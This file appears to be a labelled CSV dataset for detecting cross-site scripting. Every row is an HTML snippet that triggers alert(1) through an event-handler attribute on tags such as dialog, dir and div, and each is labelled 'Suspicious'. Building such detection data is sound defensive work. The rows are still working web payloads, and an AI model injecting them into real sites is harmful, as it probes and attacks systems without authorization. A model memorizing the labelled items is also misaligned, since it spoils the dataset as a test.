WebString,Label
"<dfn onmouseup=""alert(1)"">test</dfn>",Suspicious
"<dfn onpaste=""alert(1)"" contenteditable>test</dfn>",Suspicious
"<dialog draggable=""true"" ondrag=""alert(1)"">test</dialog>",Suspicious
"<dialog draggable=""true"" ondragend=""alert(1)"">test</dialog>",Suspicious
"<dialog draggable=""true"" ondragenter=""alert(1)"">test</dialog>",Suspicious
"<dialog draggable=""true"" ondragleave=""alert(1)"">test</dialog>",Suspicious
"<dialog draggable=""true"" ondragstart=""alert(1)"">test</dialog>",Suspicious
<dialog id=x tabindex=1 onactivate=alert(1)></dialog>,Suspicious
<dialog id=x tabindex=1 onbeforeactivate=alert(1)></dialog>,Suspicious
<dialog id=x tabindex=1 onbeforedeactivate=alert(1)></dialog><input autofocus>,Suspicious
<dialog id=x tabindex=1 ondeactivate=alert(1)></dialog><input id=y autofocus>,Suspicious
<dialog id=x tabindex=1 onfocus=alert(1)></dialog>,Suspicious
<dialog id=x tabindex=1 onfocusin=alert(1)></dialog>,Suspicious
"<dialog onbeforecopy=""alert(1)"" contenteditable>test</dialog>",Suspicious
"<dialog onbeforecut=""alert(1)"" contenteditable>test</dialog>",Suspicious
"<dialog onbeforepaste=""alert(1)"" contenteditable>test</dialog>",Suspicious
<dialog onblur=alert(1) tabindex=1 id=x></dialog><input autofocus>,Suspicious
"<dialog onclick=""alert(1)"">test</dialog>",Suspicious
"<dialog oncontextmenu=""alert(1)"">test</dialog>",Suspicious
"<dialog oncopy=""alert(1)"" contenteditable>test</dialog>",Suspicious
"<dialog oncut=""alert(1)"" contenteditable>test</dialog>",Suspicious
"<dialog ondblclick=""alert(1)"">test</dialog>",Suspicious
<dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>,Suspicious
"<dialog onkeydown=""alert(1)"" contenteditable>test</dialog>",Suspicious
"<dialog onkeypress=""alert(1)"" contenteditable>test</dialog>",Suspicious
"<dialog onkeyup=""alert(1)"" contenteditable>test</dialog>",Suspicious
"<dialog onmousedown=""alert(1)"">test</dialog>",Suspicious
"<dialog onmouseenter=""alert(1)"">test</dialog>",Suspicious
"<dialog onmouseleave=""alert(1)"">test</dialog>",Suspicious
"<dialog onmousemove=""alert(1)"">test</dialog>",Suspicious
"<dialog onmouseout=""alert(1)"">test</dialog>",Suspicious
"<dialog onmouseover=""alert(1)"">test</dialog>",Suspicious
"<dialog onmouseup=""alert(1)"">test</dialog>",Suspicious
"<dialog onpaste=""alert(1)"" contenteditable>test</dialog>",Suspicious
"<dir draggable=""true"" ondrag=""alert(1)"">test</dir>",Suspicious
"<dir draggable=""true"" ondragend=""alert(1)"">test</dir>",Suspicious
"<dir draggable=""true"" ondragenter=""alert(1)"">test</dir>",Suspicious
"<dir draggable=""true"" ondragleave=""alert(1)"">test</dir>",Suspicious
"<dir draggable=""true"" ondragstart=""alert(1)"">test</dir>",Suspicious
<dir id=x tabindex=1 onactivate=alert(1)></dir>,Suspicious
<dir id=x tabindex=1 onbeforeactivate=alert(1)></dir>,Suspicious
<dir id=x tabindex=1 onbeforedeactivate=alert(1)></dir><input autofocus>,Suspicious
<dir id=x tabindex=1 ondeactivate=alert(1)></dir><input id=y autofocus>,Suspicious
<dir id=x tabindex=1 onfocus=alert(1)></dir>,Suspicious
<dir id=x tabindex=1 onfocusin=alert(1)></dir>,Suspicious
"<dir onbeforecopy=""alert(1)"" contenteditable>test</dir>",Suspicious
"<dir onbeforecut=""alert(1)"" contenteditable>test</dir>",Suspicious
"<dir onbeforepaste=""alert(1)"" contenteditable>test</dir>",Suspicious
<dir onblur=alert(1) tabindex=1 id=x></dir><input autofocus>,Suspicious
"<dir onclick=""alert(1)"">test</dir>",Suspicious
"<dir oncontextmenu=""alert(1)"">test</dir>",Suspicious
"<dir oncopy=""alert(1)"" contenteditable>test</dir>",Suspicious
"<dir oncut=""alert(1)"" contenteditable>test</dir>",Suspicious
"<dir ondblclick=""alert(1)"">test</dir>",Suspicious
<dir onfocusout=alert(1) tabindex=1 id=x></dir><input autofocus>,Suspicious
"<dir onkeydown=""alert(1)"" contenteditable>test</dir>",Suspicious
"<dir onkeypress=""alert(1)"" contenteditable>test</dir>",Suspicious
"<dir onkeyup=""alert(1)"" contenteditable>test</dir>",Suspicious
"<dir onmousedown=""alert(1)"">test</dir>",Suspicious
"<dir onmouseenter=""alert(1)"">test</dir>",Suspicious
"<dir onmouseleave=""alert(1)"">test</dir>",Suspicious
"<dir onmousemove=""alert(1)"">test</dir>",Suspicious
"<dir onmouseout=""alert(1)"">test</dir>",Suspicious
"<dir onmouseover=""alert(1)"">test</dir>",Suspicious
"<dir onmouseup=""alert(1)"">test</dir>",Suspicious
"<dir onpaste=""alert(1)"" contenteditable>test</dir>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><abbr ondrop=alert(1) contenteditable>drop here</abbr>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><acronym ondrop=alert(1) contenteditable>drop here</acronym>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><address ondragover=alert(1) contenteditable>drop here</address>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><address ondrop=alert(1) contenteditable>drop here</address>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><applet ondragover=alert(1) contenteditable>drop here</applet>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><applet ondrop=alert(1) contenteditable>drop here</applet>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><area ondragover=alert(1) contenteditable>drop here</area>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><area ondrop=alert(1) contenteditable>drop here</area>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><article ondrop=alert(1) contenteditable>drop here</article>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable>drop here</aside>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><aside ondrop=alert(1) contenteditable>drop here</aside>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><audio ondragover=alert(1) contenteditable>drop here</audio>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><audio ondrop=alert(1) contenteditable>drop here</audio>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><b ondragover=alert(1) contenteditable>drop here</b>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><b ondrop=alert(1) contenteditable>drop here</b>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><base ondragover=alert(1) contenteditable>drop here</base>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><base ondrop=alert(1) contenteditable>drop here</base>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><basefont ondragover=alert(1) contenteditable>drop here</basefont>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><basefont ondrop=alert(1) contenteditable>drop here</basefont>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><bdo ondrop=alert(1) contenteditable>drop here</bdo>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><bgsound ondrop=alert(1) contenteditable>drop here</bgsound>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><big ondragover=alert(1) contenteditable>drop here</big>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><big ondrop=alert(1) contenteditable>drop here</big>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><blink ondragover=alert(1) contenteditable>drop here</blink>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><blink ondrop=alert(1) contenteditable>drop here</blink>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><blockquote ondrop=alert(1) contenteditable>drop here</blockquote>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><body ondragover=alert(1) contenteditable>drop here</body>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here</body>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><br ondragover=alert(1) contenteditable>drop here</br>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><br ondrop=alert(1) contenteditable>drop here</br>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><button ondragover=alert(1) contenteditable>drop here</button>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><button ondrop=alert(1) contenteditable>drop here</button>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable>drop here</canvas>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable>drop here</canvas>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><caption ondragover=alert(1) contenteditable>drop here</caption>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><caption ondrop=alert(1) contenteditable>drop here</caption>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><center ondragover=alert(1) contenteditable>drop here</center>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><center ondrop=alert(1) contenteditable>drop here</center>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable>drop here</cite>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><code ondrop=alert(1) contenteditable>drop here</code>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><col ondragover=alert(1) contenteditable>drop here</col>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><col ondrop=alert(1) contenteditable>drop here</col>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable>drop here</colgroup>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondrop=alert(1) contenteditable>drop here</colgroup>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><command ondragover=alert(1) contenteditable>drop here</command>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><command ondrop=alert(1) contenteditable>drop here</command>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><content ondrop=alert(1) contenteditable>drop here</content>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><data ondragover=alert(1) contenteditable>drop here</data>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><data ondrop=alert(1) contenteditable>drop here</data>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><datalist ondragover=alert(1) contenteditable>drop here</datalist>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><datalist ondrop=alert(1) contenteditable>drop here</datalist>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><dd ondragover=alert(1) contenteditable>drop here</dd>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable>drop here</dd>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><del ondragover=alert(1) contenteditable>drop here</del>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><del ondrop=alert(1) contenteditable>drop here</del>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><details ondragover=alert(1) contenteditable>drop here</details>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><details ondrop=alert(1) contenteditable>drop here</details>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><dfn ondragover=alert(1) contenteditable>drop here</dfn>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><dfn ondrop=alert(1) contenteditable>drop here</dfn>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable>drop here</dialog>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable>drop here</dir>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable>drop here</dir>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><div ondrop=alert(1) contenteditable>drop here</div>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><dl ondrop=alert(1) contenteditable>drop here</dl>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><element ondragover=alert(1) contenteditable>drop here</element>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><element ondrop=alert(1) contenteditable>drop here</element>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><em ondragover=alert(1) contenteditable>drop here</em>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><em ondrop=alert(1) contenteditable>drop here</em>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondrop=alert(1) contenteditable>drop here</fieldset>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable>drop here</figcaption>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><figcaption ondrop=alert(1) contenteditable>drop here</figcaption>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable>drop here</figure>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><figure ondrop=alert(1) contenteditable>drop here</figure>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable>drop here</frame>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>",Suspicious
"<div draggable=""true"" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>",Suspicious
